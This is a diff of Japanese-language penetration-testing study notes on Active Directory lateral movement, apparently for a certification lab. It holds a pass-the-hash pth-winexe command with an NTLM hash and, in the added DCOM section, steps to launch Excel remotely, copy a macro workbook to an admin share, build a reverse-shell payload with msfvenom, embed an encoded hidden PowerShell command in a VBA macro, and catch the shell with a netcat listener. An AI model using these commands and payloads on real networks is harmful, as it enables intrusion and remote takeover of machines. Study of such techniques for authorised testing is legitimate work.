@@ -13,7 +13,7 @@
 * #### pth-winexe(kaliから横展開)
 
   ```bash
-  └─$ pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //192.168.151.1   
+  └─$ pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //192.168.151.1 cmd
   E_md4hash wrapper called.
   HASH PASS: Substituting user supplied NTLM HASH...
   Microsoft Windows [Version 10.0.16299.15]
@@ -180,3 +180,92 @@ kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-4038953314-30148490
 
 
 
+### DCOM(Distributed Component Object Model)
+
+ネットワーク上の複数のコンピュータ間の相互作用のためにDCOM（Distributed Component Object Model）へと拡張
+
+ DCOM とのやりとりは、TCP 135 番ポートの RPC で行われる
+
+API である DCOM サービスコントロールマネージャを呼び出すには、ローカル管理者のアクセス権が必要
+
+* オブジェクトのインスタンスを作成
+
+  ```powershell
+  $com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "172.16.129.5"))
+  
+  $com | Get-Member
+  ```
+
+* RUNメソッドがあることを確認する
+
+  ![image-20230113084001174](img/ActiveDirectory_lateralmove/image-20230113084001174.png)
+
+* Excelでマクロを作成する
+
+  ```vbscript
+  Sub mymacro()
+      Shell ("notepad.exe")
+  End Sub
+  ```
+
+* プロファイルの要件を満たすデスクトップフォルダを作成
+
+  ```powershell
+  $Path = "\\172.16.135.5\c$\Windows\sysWOW64\config\systemprofile\Desktop"
+  
+  $temp = [system.io.directory]::createDirectory($Path)
+  ```
+
+* リモートにexcelファイルをコピーし実行する
+
+  ```powershell
+  $com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "172.16.135.5"))
+  
+  $LocalPath = "C:\Users\jeff_admin\myexcel.xls"
+  
+  $RemotePath = "\\172.16.135.5\c$\myexcel.xls"
+  
+  [System.IO.File]::Copy($LocalPath, $RemotePath, $True)
+  
+  $temp = [system.io.directory]::createDirectory($Path)
+  
+  $Workbook = $com.Workbooks.Open("C:\myexcel.xls")
+  
+  $com.Run("mymacro")
+  ```
+
+* リバースシェル版でマクロを再作成する
+
+  ```
+  msfvenom -p windows/shell_reverse_tcp LHOST=172.16.135.10 LPORT=4444 -f hta-psh -o evil.hta
+  ```
+
+  pythonで文字列分割する(python.mdを参照)
+
+  ```
+  Sub mymacro()
+      
+      Dim Str As String
+      Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
+      Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
+      Str = Str + "kAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnA"
+      Str = Str + "H0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGk"
+      Str = Str + "AcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8Ad"
+   
+      Str = Str + "HQAeQBsAGUAPQAnAEgAaQBkAGQAZQBuACcAOwAkAHMALgBDAHI"
+      Str = Str + "AZQBhAHQAZQBOAG8AVwBpAG4AZABvAHcAPQAkAHQAcgB1AGUAO"
+      Str = Str + "wAkAHAAPQBbAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB"
+      Str = Str + "0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBdADoAOgBTAHQAYQByA"
+      Str = Str + "HQAKAAkAHMAKQA7AA=="
+      
+      Shell (Str)
+  End Sub
+  ```
+
+* ネットキャットで待機し、リモートにファイルコピーして改めてマクロを実行する
+
+  ```cmd
+  PS C:\Tools\practical_tools> nc.exe -lvnp 4444
+  ```
+
+  
